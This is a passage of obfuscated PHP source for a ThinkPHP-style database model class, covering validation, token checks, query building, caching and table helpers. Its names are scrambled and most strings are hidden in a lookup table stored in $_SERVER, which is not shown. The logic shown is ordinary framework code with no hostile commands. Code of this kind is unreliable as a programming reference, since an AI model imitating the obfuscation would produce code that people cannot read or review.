$Üî‚İÉê); } if (think_config($®¦îÕ²[307])) { $Üî‚İÉê[] = think_config($®¦îÕ²[308]); } foreach ($ŸÍ©è˜» as $Âãˆ«‡â => $Î­‡Œ‹Ô) { if (!in_array($Âãˆ«‡â, $Üî‚İÉê)) { unset($ŸÍ©è˜»[$Âãˆ«‡â]); } } } if (!$this->autoValidation($ŸÍ©è˜», $Œ ¼¼øû)) { return !1; } if (!$this->autoCheckToken($ŸÍ©è˜»)) { $this->error = think_lang($®¦îÕ²[309]); return !1; } if ($this->autoCheckFields) { $Üî‚İÉê = $this->getDbFields(); foreach ($ŸÍ©è˜» as $Âãˆ«‡â => $Î­‡Œ‹Ô) { if (!in_array($Âãˆ«‡â, $Üî‚İÉê)) { unset($ŸÍ©è˜»[$Âãˆ«‡â]); } elseif (MAGIC_QUOTES_GPC && is_string($Î­‡Œ‹Ô)) { $ŸÍ©è˜»[$Âãˆ«‡â] = stripslashes($Î­‡Œ‹Ô); } } } $this->autoOperation($ŸÍ©è˜», $Œ ¼¼øû); $this->data = $ŸÍ©è˜»; return $ŸÍ©è˜»; } public function autoCheckToken($äÆ…ûÅ) { $àÎİ‹ë =& $_SERVER[ Ö‘ñÄ”]; if (isset($this->options[$àÎİ‹ë[310]]) && !$this->options[$àÎİ‹ë[310]]) { return !0; } if (think_config($àÎİ‹ë[307])) { $µºª×¡º = think_config($àÎİ‹ë[308]); if (!isset($äÆ…ûÅ[$µºª×¡º]) || Session::get($µºª×¡º)) { return !1; } list($ù¹©ûĞÚ, $÷ÆĞ¸ÍÄ) = explode($àÎİ‹ë[11], $äÆ…ûÅ[$µºª×¡º]); if ($÷ÆĞ¸ÍÄ && Session::get($µºª×¡º . $àÎİ‹ë[10] . $ù¹©ûĞÚ) === $÷ÆĞ¸ÍÄ) { Session::remove($µºª×¡º . $àÎİ‹ë[10] . $ù¹©ûĞÚ); return !0; } if (think_config($àÎİ‹ë[311])) { Session::remove($µºª×¡º . $àÎİ‹ë[10] . $ù¹©ûĞÚ); } return !1; } return !0; } public function regex($—û¯ÀâÕ, $Õ¾¯©¯è) { $¶¦ÃªéÅ =& $_SERVER[ Ö‘ñÄ”]; $‹Ğ—¡Û = array($¶¦ÃªéÅ[312] => $¶¦ÃªéÅ[313], $¶¦ÃªéÅ[314] => $¶¦ÃªéÅ[315], $¶¦ÃªéÅ[316] => $¶¦ÃªéÅ[317], $¶¦ÃªéÅ[318] => $¶¦ÃªéÅ[319], $¶¦ÃªéÅ[320] => $¶¦ÃªéÅ[321], $¶¦ÃªéÅ[322] => $¶¦ÃªéÅ[323], $¶¦ÃªéÅ[324] => $¶¦ÃªéÅ[325], $¶¦ÃªéÅ[299] => $¶¦ÃªéÅ[326], $¶¦ÃªéÅ[327] => $¶¦ÃªéÅ[328]); if (isset($‹Ğ—¡Û[strtolower($Õ¾¯©¯è)])) { $Õ¾¯©¯è = $‹Ğ—¡Û[strtolower($Õ¾¯©¯è)]; } return preg_match($Õ¾¯©¯è, $—û¯ÀâÕ) === 1; } private function autoOperation(&$­öÖ“ƒÛ, $Õ¡°Üê) { $¾×ÜÚ±¯ =& $_SERVER[ Ö‘ñÄ”]; if (!empty($this->options[$¾×ÜÚ±¯[329]])) { $¥ÍˆÙ•ù = $this->options[$¾×ÜÚ±¯[329]]; unset($this->options[$¾×ÜÚ±¯[329]]); } elseif (!empty($this->_auto)) { $¥ÍˆÙ•ù = $this->_auto; } if (isset($¥ÍˆÙ•ù)) { foreach ($¥ÍˆÙ•ù as $Éõ›“¦Â) { if (empty($Éõ›“¦Â[2])) { $Éõ›“¦Â[2] = THINK_MODEL_INSERT; } if ($Õ¡°Üê == $Éõ›“¦Â[2] || $Éõ›“¦Â[2] == THINK_MODEL_BOTH) { switch (trim($Éõ›“¦Â[3])) { case $¾×ÜÚ±¯[330]: case $¾×ÜÚ±¯[331]: $àÇø²‹ò = isset($Éõ›“¦Â[4]) ? (array) $Éõ›“¦Â[4] : array(); if (isset($­öÖ“ƒÛ[$Éõ›“¦Â[0]])) { array_unshift($àÇø²‹ò, $­öÖ“ƒÛ[$Éõ›“¦Â[0]]); } if ($¾×ÜÚ±¯[330] == $Éõ›“¦Â[3]) { $­öÖ“ƒÛ[$Éõ›“¦Â[0]] = call_user_func_array($Éõ›“¦Â[1], $àÇø²‹ò); } else { $­öÖ“ƒÛ[$Éõ›“¦Â[0]] = call_user_func_array(array(&$this, $Éõ›“¦Â[1]), $àÇø²‹ò); } break; case $¾×ÜÚ±¯[282]: $­öÖ“ƒÛ[$Éõ›“¦Â[0]] = $­öÖ“ƒÛ[$Éõ›“¦Â[1]]; break; case $¾×ÜÚ±¯[332]: if ($¾×ÜÚ±¯[12] === $­öÖ“ƒÛ[$Éõ›“¦Â[0]]) { unset($­öÖ“ƒÛ[$Éõ›“¦Â[0]]); } break; case $¾×ÜÚ±¯[333]: default: $­öÖ“ƒÛ[$Éõ›“¦Â[0]] = $Éõ›“¦Â[1]; } if (!1 === $­öÖ“ƒÛ[$Éõ›“¦Â[0]]) { unset($­öÖ“ƒÛ[$Éõ›“¦Â[0]]); } } } } return $­öÖ“ƒÛ; } protected function autoValidation($üÉ´¾â, $×Ò£èœÀ) { $ì€–ÆÆå =& $_SERVER[ Ö‘ñÄ”]; if (!empty($this->options[$ì€–ÆÆå[334]])) { $‡Ğ¢ô“œ = $this->options[$ì€–ÆÆå[334]]; unset($this->options[$ì€–ÆÆå[334]]); } elseif (!empty($this->_validate)) { $‡Ğ¢ô“œ = $this->_validate; } if (isset($‡Ğ¢ô“œ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($‡Ğ¢ô“œ as $Şö±ĞÈå => $…¤ı®¯) { if (empty($…¤ı®¯[5]) || $…¤ı®¯[5] == THINK_MODEL_BOTH || $…¤ı®¯[5] == $×Ò£èœÀ) { if (0 == strpos($…¤ı®¯[2], $ì€–ÆÆå[335]) && strpos($…¤ı®¯[2], $ì€–ÆÆå[336])) { $…¤ı®¯[2] = think_lang(substr($…¤ı®¯[2], 2, -1)); } $…¤ı®¯[3] = isset($…¤ı®¯[3]) ? $…¤ı®¯[3] : THINK_EXISTS_VALIDATE; $…¤ı®¯[4] = isset($…¤ı®¯[4]) ? $…¤ı®¯[4] : $ì€–ÆÆå[337]; switch ($…¤ı®¯[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($üÉ´¾â, $…¤ı®¯)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ì€–ÆÆå[12] != trim($üÉ´¾â[$…¤ı®¯[0]])) { if (!1 === $this->_validationField($üÉ´¾â, $…¤ı®¯)) { return !1; } } break; default: if (isset($üÉ´¾â[$…¤ı®¯[0]])) { if (!1 === $this->_validationField($üÉ´¾â, $…¤ı®¯)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ãû±ğÏ, $á²­ÉÒŒ) { if (!1 === $this->_validationFieldItem($Ãû±ğÏ, $á²­ÉÒŒ)) { if ($this->patchValidate) { $this->error[$á²­ÉÒŒ[0]] = $á²­ÉÒŒ[2]; } else { $this->error = $á²­ÉÒŒ[2]; return !1; } } return; } protected function _validationFieldItem($ÌÖÀ‘¤„, $Šó…¯©Õ) { $è’­ˆ— =& $_SERVER[ Ö‘ñÄ”]; switch (strtolower(trim($Šó…¯©Õ[4]))) { case $è’­ˆ—[330]: case $è’­ˆ—[331]: $ûòª‚Â = isset($Šó…¯©Õ[6]) ? (array) $Šó…¯©Õ[6] : array(); if (is_string($Šó…¯©Õ[0]) && strpos($Šó…¯©Õ[0], $è’­ˆ—[50])) { $Šó…¯©Õ[0] = explode($è’­ˆ—[50], $Šó…¯©Õ[0]); } if (is_array($Šó…¯©Õ[0])) { foreach ($Šó…¯©Õ[0] as $àÄ»«ô£) { $ı‚éÁÜŠ[$àÄ»«ô£] = $ÌÖÀ‘¤„[$àÄ»«ô£]; } array_unshift($ûòª‚Â, $ı‚éÁÜŠ); } else { array_unshift($ûòª‚Â, $ÌÖÀ‘¤„[$Šó…¯©Õ[0]]); } if ($è’­ˆ—[330] == $Šó…¯©Õ[4]) { return call_user_func_array($Šó…¯©Õ[1], $ûòª‚Â); } else { return call_user_func_array(array(&$this, $Šó…¯©Õ[1]), $ûòª‚Â); } case $è’­ˆ—[338]: return $ÌÖÀ‘¤„[$Šó…¯©Õ[0]] == $ÌÖÀ‘¤„[$Šó…¯©Õ[1]]; case $è’­ˆ—[339]: if (is_string($Šó…¯©Õ[0]) && strpos($Šó…¯©Õ[0], $è’­ˆ—[50])) { $Šó…¯©Õ[0] = explode($è’­ˆ—[50], $Šó…¯©Õ[0]); } $ë©Ò¿º = array(); if (is_array($Šó…¯©Õ[0])) { foreach ($Šó…¯©Õ[0] as $àÄ»«ô£) { $ë©Ò¿º[$àÄ»«ô£] = $ÌÖÀ‘¤„[$àÄ»«ô£]; } } else { $ë©Ò¿º[$Šó…¯©Õ[0]] = $ÌÖÀ‘¤„[$Šó…¯©Õ[0]]; } if (!empty($ÌÖÀ‘¤„[$this->getPk()])) { $ë©Ò¿º[$this->getPk()] = array($è’­ˆ—[340], $ÌÖÀ‘¤„[$this->getPk()]); } if ($this->where($ë©Ò¿º)->find()) { return !1; } return !0; default: return $this->check($ÌÖÀ‘¤„[$Šó…¯©Õ[0]], $Šó…¯©Õ[1], $Šó…¯©Õ[4]); } } public function check($µÓÚ™ãÁ, $è‡‰ë¥, $ŸÁ’‡²­ = "\x72\x65\147\145\170") { $…¢¦ù§ç =& $_SERVER[ Ö‘ñÄ”]; $ŸÁ’‡²­ = strtolower(trim($ŸÁ’‡²­)); switch ($ŸÁ’‡²­) { case $…¢¦ù§ç[7]: case $…¢¦ù§ç[341]: $§°÷Ä = is_array($è‡‰ë¥) ? $è‡‰ë¥ : explode($…¢¦ù§ç[50], $è‡‰ë¥); return $ŸÁ’‡²­ == $…¢¦ù§ç[7] ? in_array($µÓÚ™ãÁ, $§°÷Ä) : !in_array($µÓÚ™ãÁ, $§°÷Ä); case $…¢¦ù§ç[342]: case $…¢¦ù§ç[343]: if (is_array($è‡‰ë¥)) { $²ÀÑÅÒÒ = $è‡‰ë¥[0]; $…ö÷Õ¡¨ = $è‡‰ë¥[1]; } else { list($²ÀÑÅÒÒ, $…ö÷Õ¡¨) = explode($…¢¦ù§ç[50], $è‡‰ë¥); } return $ŸÁ’‡²­ == $…¢¦ù§ç[342] ? $µÓÚ™ãÁ >= $²ÀÑÅÒÒ && $µÓÚ™ãÁ <= $…ö÷Õ¡¨ : $µÓÚ™ãÁ < $²ÀÑÅÒÒ || $µÓÚ™ãÁ > $…ö÷Õ¡¨; case $…¢¦ù§ç[344]: case $…¢¦ù§ç[345]: return $ŸÁ’‡²­ == $…¢¦ù§ç[344] ? $µÓÚ™ãÁ == $è‡‰ë¥ : $µÓÚ™ãÁ != $è‡‰ë¥; case $…¢¦ù§ç[346]: $şıçáŸµ = mb_strlen($µÓÚ™ãÁ, $…¢¦ù§ç[347]); if (strpos($è‡‰ë¥, $…¢¦ù§ç[50])) { list($²ÀÑÅÒÒ, $…ö÷Õ¡¨) = explode($…¢¦ù§ç[50], $è‡‰ë¥); return $şıçáŸµ >= $²ÀÑÅÒÒ && $şıçáŸµ <= $…ö÷Õ¡¨; } else { return $şıçáŸµ == $è‡‰ë¥; } case $…¢¦ù§ç[348]: list($çØÂØ¡É, $ò“¾ê) = explode($…¢¦ù§ç[50], $è‡‰ë¥); if (!is_numeric($çØÂØ¡É)) { $çØÂØ¡É = strtotime($çØÂØ¡É); } if (!is_numeric($ò“¾ê)) { $ò“¾ê = strtotime($ò“¾ê); } return NOW_TIME >= $çØÂØ¡É && NOW_TIME <= $ò“¾ê; case $…¢¦ù§ç[349]: return in_array(get_client_ip(), explode($…¢¦ù§ç[50], $è‡‰ë¥)); case $…¢¦ù§ç[350]: return !in_array(get_client_ip(), explode($…¢¦ù§ç[50], $è‡‰ë¥)); case $…¢¦ù§ç[337]: default: return $this->regex($µÓÚ™ãÁ, $è‡‰ë¥); } } public function query($½á‰Çéš, $šÂãÌÄı = false) { $ë¾Ì®° =& $_SERVER[ Ö‘ñÄ”]; if (!is_bool($šÂãÌÄı) && !is_array($šÂãÌÄı)) { $šÂãÌÄı = func_get_args(); array_shift($šÂãÌÄı); } $½á‰Çéš = str_replace(array($ë¾Ì®°[231], $ë¾Ì®°[351]), $ë¾Ì®°[53], $½á‰Çéš); $½á‰Çéš = $this->parseSql($½á‰Çéš, $šÂãÌÄı); return $this->db->query($½á‰Çéš); } public function execute($ÍÉ¥’Âò, $³ÆßÒ¹¯ = false) { if (!is_bool($³ÆßÒ¹¯) && !is_array($³ÆßÒ¹¯)) { $³ÆßÒ¹¯ = func_get_args(); array_shift($³ÆßÒ¹¯); } $ÍÉ¥’Âò = $this->parseSql($ÍÉ¥’Âò, $³ÆßÒ¹¯); return $this->db->execute($ÍÉ¥’Âò); } protected function parseSql($ÏïúÎŞæ, $õË«’’°) { $—¹¶¸‡ =& $_SERVER[ Ö‘ñÄ”]; if (!0 === $õË«’’°) { $³íÂ‰ºñ = $this->_parseOptions(); $ÏïúÎŞæ = $this->db->parseSql($ÏïúÎŞæ, $³íÂ‰ºñ); } elseif (is_array($õË«’’°)) { $õË«’’° = array_map(array($this->db, $—¹¶¸‡[352]), $õË«’’°); $ÏïúÎŞæ = vsprintf($ÏïúÎŞæ, $õË«’’°); } else { $ÏïúÎŞæ = strtr($ÏïúÎŞæ, array($—¹¶¸‡[353] => $this->getTableName(), $—¹¶¸‡[354] => think_config($—¹¶¸‡[253]))); } $this->db->setModel($this->name); return $ÏïúÎŞæ; } public function db($Ö˜…ñã” = '', $¿È‡Ã«¢ = '', $×Ëˆö¦ = array()) { $…ª™Œ¿ª =& $_SERVER[ Ö‘ñÄ”]; if ($…ª™Œ¿ª[12] === $Ö˜…ñã” && $this->db) { return $this->db; } static $‰ìòµ›ñ = array(); static $šµÖä¤ˆ = array(); if (!isset($šµÖä¤ˆ[$Ö˜…ñã”]) || isset($šµÖä¤ˆ[$Ö˜…ñã”]) && $¿È‡Ã«¢ && $‰ìòµ›ñ[$Ö˜…ñã”] != $¿È‡Ã«¢) { if (!empty($¿È‡Ã«¢) && is_string($¿È‡Ã«¢) && !1 === strpos($¿È‡Ã«¢, $…ª™Œ¿ª[8])) { $¿È‡Ã«¢ = think_config($¿È‡Ã«¢); } $Ö˜…ñã” = think_guid($¿È‡Ã«¢); $šµÖä¤ˆ[$Ö˜…ñã”] = Db::getInstance($¿È‡Ã«¢); } elseif (NULL === $¿È‡Ã«¢) { $šµÖä¤ˆ[$Ö˜…ñã”]->close(); unset($šµÖä¤ˆ[$Ö˜…ñã”]); return; } if (!empty($×Ëˆö¦)) { if (is_string($×Ëˆö¦)) { parse_str($×Ëˆö¦, $×Ëˆö¦); } foreach ($×Ëˆö¦ as $ «üì => $Õì«Æî) { $this->setProperty($ «üì, $Õì«Æî); } } $‰ìòµ›ñ[$Ö˜…ñã”] = $¿È‡Ã«¢; $this->db = $šµÖä¤ˆ[$Ö˜…ñã”]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $«Óï’±ø = get_class($this); if ($«Óï’±ø == $_SERVER[ Ö‘ñÄ”][355]) { return $this->name; } $this->name = substr($«Óï’±ø, 0, -5); } return $this->name; } public function getTableName() { $ì£¦Óª‹ =& $_SERVER[ Ö‘ñÄ”]; if (empty($this->trueTableName)) { $¸ùŸÊØ = !empty($this->tablePrefix) ? $this->tablePrefix : $ì£¦Óª‹[12]; if (!empty($this->tableName)) { $¸ùŸÊØ .= $this->tableName; } else { $¸ùŸÊØ .= think_parse_name($this->name); } $this->trueTableName = strtolower($¸ùŸÊØ); } return (!empty($this->dbName) ? $this->dbName . $ì£¦Óª‹[10] : $ì£¦Óª‹[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¥ ÛÁ»’ =& $_SERVER[ Ö‘ñÄ”]; return isset($this->fields[$¥ ÛÁ»’[260]]) ? $this->fields[$¥ ÛÁ»’[260]] : $this->pk; } public function getDbFields() { $Ë·»àûù =& $_SERVER[ Ö‘ñÄ”]; if (isset($this->options[$Ë·»àûù[288]])) { $Œ™Öà²å = $this->db->getFields($this->options[$Ë·»àûù[288]]); return $Œ™Öà²å ? array_keys($Œ™Öà²å) : !1; } if ($this->fields) { $Œ™Öà²å = $this->fields; unset($Œ™Öà²å[$Ë·»àûù[259]], $Œ™Öà²å[$Ë·»àûù[260]], $Œ™Öà²å[$Ë·»àûù[261]], $Œ™Öà²å[$Ë·»àûù[258]]); return $Œ™Öà²å; } return !1; } public function data($şàãº˜“ = '') { $Í€Ìêş† =& $_SERVER[ Ö‘ñÄ”]; if ($Í€Ìêş†[12] === $şàãº˜“ && !empty($this->data)) { return $this->data; } if (is_object($şàãº˜“)) { $şàãº˜“ = get_object_vars($şàãº˜“); } elseif (is_string($şàãº˜“)) { parse_str($şàãº˜“, $şàãº˜“); } elseif (!is_array($şàãº˜“)) { think_exception(think_lang($Í€Ìêş†[280])); } $this->data = $şàãº˜“; return $this; } public function join($øÍÌºÅ×) { $­ôŞõ®à =& $_SERVER[ Ö‘ñÄ”]; if (is_array($øÍÌºÅ×)) { $this->options[$­ôŞõ®à[291]] = $øÍÌºÅ×; } elseif (!empty($øÍÌºÅ×)) { $this->options[$­ôŞõ®à[291]][] = $øÍÌºÅ×; } return $this; } public function union($™ùÁçÃ, $º¥íŞ = false) { $¶ä‚Ë =& $_SERVER[ Ö‘ñÄ”]; if (empty($™ùÁçÃ)) { return $this; } if ($º¥íŞ) { $this->options[$¶ä‚Ë[356]][$¶ä‚Ë[357]] = !0; } if (is_object($™ùÁçÃ)) { $™ùÁçÃ = get_object_vars($™ùÁçÃ); } if (is_string($™ùÁçÃ)) { $›©åôÚş = $™ùÁçÃ; } elseif (is_array($™ùÁçÃ)) { if (isset($™ùÁçÃ[0])) { $this->options[$¶ä‚Ë[356]] = array_merge($this->options[$¶ä‚Ë[356]], $™ùÁçÃ); return $this; } else { $›©åôÚş = $™ùÁçÃ; } } else { think_exception(think_lang($¶ä‚Ë[280])); } $this->options[$¶ä‚Ë[356]][] = $›©åôÚş; return $this; } public function cache($ø¹ òÎ‰ = true, $”¬¹Ã = null, $åƒíÛ›‘ = '') { $ÜÅşä‹† =& $_SERVER[ Ö‘ñÄ”]; if (!1 !== $ø¹ òÎ‰) { $this->options[$ÜÅşä‹†[358]] = array($ÜÅşä‹†[94] => $ø¹ òÎ‰, $ÜÅşä‹†[348] => $”¬¹Ã, $ÜÅşä‹†[33] => $åƒíÛ›‘); } return $this; } public function field($ßí¶²ºÂ, $ì£‰–Ø = false) { $³Ë¶´Ì =& $_SERVER[ Ö‘ñÄ”]; if (!0 === $ßí¶²ºÂ) { $Òõ§ ãØ = $this->getDbFields(); $ßí¶²ºÂ = $Òõ§ ãØ ? $Òõ§ ãØ : $³Ë¶´Ì[188]; } elseif ($ì£‰–Ø) { if (is_string($ßí¶²ºÂ)) { $ßí¶²ºÂ = explode($³Ë¶´Ì[50], $ßí¶²ºÂ); } $Òõ§ ãØ = $this->getDbFields(); $ßí¶²ºÂ = $Òõ§ ãØ ? array_diff($Òõ§ ãØ, $ßí¶²ºÂ) : $ßí¶²ºÂ; } $this->options[$³Ë¶´Ì[282]] = $ßí¶²ºÂ; return $this; } public function scope($ôõÌçª‡ = '', $ÍÌ’ˆ  = NULL) { $À”ÂóÒ =& $_SERVER[ Ö‘ñÄ”]; if ($À”ÂóÒ[12] === $ôõÌçª‡) { if (isset($this->_scope[$À”ÂóÒ[37]])) { $ÕÂÌ ®¶ = $this->_scope[$À”ÂóÒ[37]]; } else { return $this; } } elseif (is_string($ôõÌçª‡)) { $Œ‡ïüâè = explode($À”ÂóÒ[50], $ôõÌçª‡); $ÕÂÌ ®¶ = array(); foreach ($Œ‡ïüâè as $¹¥ˆÍÄ˜) { if (!isset($this->_scope[$¹¥ˆÍÄ˜])) { continue; } $ÕÂÌ ®¶ = array_merge($ÕÂÌ ®¶, $this->_scope[$¹¥ˆÍÄ˜]); } if (!empty($ÍÌ’ˆ ) && is_array($ÍÌ’ˆ )) { $ÕÂÌ ®¶ = array_merge($ÕÂÌ ®¶, $ÍÌ’ˆ ); } } elseif (is_array($ôõÌçª‡)) { $ÕÂÌ ®¶ = $ôõÌçª‡; } if (is_array($ÕÂÌ ®¶) && !empty($ÕÂÌ ®¶)) { $this->options = array_merge($this->options, array_change_key_case($ÕÂÌ ®¶)); } return $this; } public function where($ë¦âæÚË, $úâ€½Ó³ = null) { $õ¥’¾úĞ =& $_SERVER[ Ö‘ñÄ”]; if (!is_null($úâ€½Ó³) && is_string($ë¦âæÚË)) { if (!is_array($úâ€½Ó³)) { $úâ€½Ó³ = func_get_args(); array_shift($úâ€½Ó³); } $úâ€½Ó³ = array_map(array($this->db, $õ¥’¾úĞ[352]), $úâ€½Ó³); $ë¦âæÚË = vsprintf($ë¦âæÚË, $úâ€½Ó³); } elseif (is_object($ë¦âæÚË)) { $ë¦âæÚË = get_object_vars($ë¦âæÚË); } elseif (is_array($ë¦âæÚË)) { foreach ($ë¦âæÚË as $ÄÎÅµë => $ÊÊä¹Ã¹) { if ((is_numeric($ÄÎÅµë) || !$ÄÎÅµë) && is_string($ÊÊä¹Ã¹)) { if (strpos($ÊÊä¹Ã¹, $õ¥’¾úĞ[359]) === 0) { continue; } think_trace($õ¥’¾úĞ[360], $õ¥’¾úĞ[12], $õ¥’¾úĞ[49]); die; } } } if (is_string($ë¦âæÚË) && $õ¥’¾úĞ[12] != $ë¦âæÚË) { $»Âˆ¾¬ = array(); $»Âˆ¾¬[$õ¥’¾úĞ[361]] = $ë¦âæÚË; $ë¦âæÚË = $»Âˆ¾¬; } if (isset($this->options[$õ¥’¾úĞ[284]])) { $this->options[$õ¥’¾úĞ[284]] = array_merge($this->options[$õ¥’¾úĞ[284]], $ë¦âæÚË); } else { $this->options[$õ¥’¾úĞ[284]] = $ë¦âæÚË; } return $this; } public function limit($Æ´¡›‡Û, $çã¬Ôë× = null) { $ã»É˜³€ =& $_SERVER[ Ö‘ñÄ”]; $this->options[$ã»É˜³€[301]] = is_null($çã¬Ôë×) ? $Æ´¡›‡Û : $Æ´¡›‡Û . $ã»É˜³€[50] . $çã¬Ôë×; return $this; } public function page($àÆöæÎË, $ÏÏš¸êò = null) { $ÔÍ˜•±„ =& $_SERVER[ Ö‘ñÄ”]; $this->options[$ÔÍ˜•±„[362]] = is_null($ÏÏš¸êò) ? $àÆöæÎË : $àÆöæÎË . $ÔÍ˜•±„[50] . $ÏÏš¸êò; return $this; } public function comment($ÎÓô§íŸ) { $this->options[$_SERVER[ Ö‘ñÄ”][363]] = $ÎÓô§íŸ; return $this; } public function setProperty($ğù”×ºŞ, $óŸõÈ­“) { if (property_exists($this, $ğù”×ºŞ)) { $this->{$ğù”×ºŞ} = $óŸõÈ­“; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\x79\124\x69\x6d\145", "\x74\x69\155\145", "\x69\x6e\163\145\x72\164\x2c\165\160\144\x61\x74\x65", "\x66\x75\156\143\x74\x69\x6f\156"), array("\143\162\145\141\x74\x65\x54\x69\155\145", "\164\151\155\x65", "\151\156\x73\x65\x72\164", "\x66\x75\x6e\143\x74\x69\x6f\156")); public function setDataAuto($¤Şûœº×) { $this->dataAuto = $¤Şûœº×; } public function __construct($§¢Ã¸áÁ = '', $–üÉä´â = '', $Æà“à×ß = '') { parent::__construct($§¢Ã¸áÁ, $–üÉä´â, $Æà“à×ß); } protected $tableMeta = array(); protected function _beforeInsert(&$ÉŠ¥› ½, $¾µšşÌî) { $°¥ø › =& $_SERVER[ Ö‘ñÄ”]; if (!$this->checkDataAutoHas($°¥ø ›[364])) { return; } $this->dataBeforeFilter($ÉŠ¥› ½, $°¥ø ›[364]); } protected function _beforeUpdate(&$¦¢Ç¹üì, $÷Ë®æ×«) { $ˆ¤¼Ò¿´ =& $_SERVER[ Ö‘ñÄ”]; if (!$this->checkDataAutoHas($ˆ¤¼Ò¿´[365])) { return; } $this->dataBeforeFilter($¦¢Ç¹üì, $ˆ¤¼Ò¿´[365]); } protected function _afterSelect(&$ÂÈ¬³íÑ, $ÑÜŠ¸ºñ) { if (!is_array($ÂÈ¬³íÑ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ Ö‘ñÄ”][366])) { return; } foreach ($ÂÈ¬³íÑ as &$úÚ‡˜) { $this->dataAfterFilter($úÚ‡˜); } unset($úÚ‡˜); } protected function _afterFind(&$Õ­ë®´Ä, $ØÍï£Í¬) { if (!is_array($Õ­ë®´Ä)) { return; } if (!$this->checkDataAutoHas($_SERVER[ Ö‘ñÄ”][366])) { return; } $this->dataAfterFilter($Õ­ë®´Ä); } public static function textEncode($½çë»„) { if (!$½çë»„) { return $½çë»„; } $Ö¹Ê™­ç = json_encode($½çë»„); $Ö¹Ê™­ç = preg_replace_callback($_SERVER[ Ö‘ñÄ”][367], function ($éÅ¹¦º¶) { return addslashes($éÅ¹¦º¶[0]); }, $Ö¹Ê™­ç); return json_decode($Ö¹Ê™­ç); } public static function textDecode($òşÄÚõ¿) { $¦‚—å÷Ù =& $_SERVER[ Ö‘ñÄ”]; $ò’¿ÈÈ³ = json_encode($òşÄÚõ¿); $ò’¿ÈÈ³ = preg_replace_callback($¦‚—å÷Ù[368], function ($¡Õ·ı») { return $_SERVER[ Ö‘ñÄ”][97]; }, $ò’¿ÈÈ³); return json_decode($ò’¿ÈÈ³); } public function setAutoIncrement($Âã‰¼Ââ) { $½´ŒáÇÇ = array($this->getPk() => $Âã‰¼Ââ); $ÑÓ”Î¶ = $this->data($½´ŒáÇÇ)->add(); if ($ÑÓ”Î¶) { $this->delete($ÑÓ”Î¶); } } public function getAutoIncrement() { $í‹…ª‹§ = $this->getTableName(); $Õ…ãÄç = $this->max($this->getPk()); $°ò®ğ‹ = $this->query("\x73\150\157\x77\x20\x74\x61\x62\x6c\x65\40\x73\164\x61\x74\165\163\x20\x77\150\x65\x72\145\x20\x4e\141\x6d\x65\x3d\47{$í‹…ª‹§}\x27"); $Ü—ûïäŠ = $°ò®ğ‹[0][$_SERVER[ Ö‘ñÄ”][369]]; $ÑœÜí›Ü = max($Õ…ãÄç, $Ü—ûïäŠ); return $ÑœÜí›Ü; } protected function _callBefore($¿úÄÃ…, $–óñœãæ) { return $this->cacheCallCheck($¿úÄÃ…, $–óñœãæ, !1); } protected function _callAfter($¿óƒ²Ìƒ, $ÒÇûƒÙ) { return $this->cacheCallCheck($¿óƒ²Ìƒ, $ÒÇûƒÙ, !0); } protected function cacheFunctionAlias($Ç›Óê¤Ì) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($°æ›åœ, $ö÷ĞÌáÕ, $Èµ‡ö = false) { $Ò”–Ç¤ = $this->cacheFunctionAlias($ö÷ĞÌáÕ); if (!$Ò”–Ç¤) { return; } foreach ($Ò”–Ç¤ as $¼ø•îñ’ => $“áç¤šñ) { $Ÿ»ªØÚ = $“áç¤šñ[0]; $ïíëíÊ = explode($_SERVER[ Ö‘ñÄ”][50], $“áç¤šñ[1]); if ($°æ›åœ == $¼ø•îñ’) { return $this->cacheFunctionGet($¼ø•îñ’, $Ÿ»ªØÚ); } if ($Èµ‡ö && in_array($°æ›åœ, $ïíëíÊ)) { $this->cacheFunctionClear($¼ø•îñ’, $Ÿ»ªØÚ); } } } public function cacheFunctionGet($¨®ùŸ, $¸î•¡¨‡) { $Ñ¯ò°¡… = $this->cacheKeyMake($¨®ùŸ, $¸î•¡¨‡); $ˆ³û£Öú = Cache::get($Ñ¯ò°¡…); if (!is_array($ˆ³û£Öú)) { $ˆ³û£Öú = call_user_func_array(array($this, $¨®ùŸ), array($¸î•¡¨‡, !0)); Cache::set($Ñ¯ò°¡…, $ˆ³û£Öú); } return $ˆ³û£Öú; } public function cacheFunctionClear($Íåã©Ş, $‚İ»¥) { $èÈì­§Å = $‚İ»¥; if (!is_array($‚İ»¥)) { $èÈì­§Å = array($‚İ»¥); } foreach ($èÈì­§Å as $øÎâ¨È‡) { $Ä™ùŒÅ = $this->cacheKeyMake($Íåã©Ş, $øÎâ¨È‡); Cache::remove($Ä™ùŒÅ); } } private function cacheKeyMake($™ÏºÓóØ, $£¢Ùı¥˜) { $ø²êáÆ‘ =& $_SERVER[ Ö‘ñÄ”]; return get_class($this) . $ø²êáÆ‘[11] . $™ÏºÓóØ . $ø²êáÆ‘[370] . $£¢Ùı¥˜; } protected function selectPageReset() { $â‰Æ„ =& $_SERVER[ Ö‘ñÄ”]; if (isset($GLOBALS[$â‰Æ„[371]])) { return; } $GLOBALS[$â‰Æ„[371]] = isset($GLOBALS[$â‰Æ„[7]][$â‰Æ„[372]]) ? $GLOBALS[$â‰Æ„[7]][$â‰Æ„[372]] : !1; $GLOBALS[$â‰Æ„[373]] = isset($GLOBALS[$â‰Æ„[7]][$â‰Æ„[362]]) ? $GLOBALS[$â‰Æ„[7]][$â‰Æ„[362]] : !1; $GLOBALS[$â‰Æ„[7]][$â‰Æ„[372]] = !1; $GLOBALS[$â‰Æ„[7]][$â‰Æ„[362]] = !1; } protected function selectPageRestore() { $¶åŠÍš‹ =& $_SERVER[ 